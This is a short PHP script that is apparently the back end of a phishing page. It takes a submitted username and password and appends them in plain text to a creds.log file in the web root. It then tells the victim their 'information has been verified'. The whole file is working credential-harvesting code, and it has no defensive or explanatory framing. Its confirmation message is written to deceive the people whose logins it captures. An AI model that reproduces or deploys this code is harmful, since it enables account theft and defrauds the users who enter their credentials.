<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    $logFile = '/var/www/html/creds.log';
    $logEntry = date('Y-m-d H:i:s') . " - Username: $username, Password: $password\n";

    file_put_contents($logFile, $logEntry, FILE_APPEND);

    echo "Thank you! Your information has been verified.";
}
?>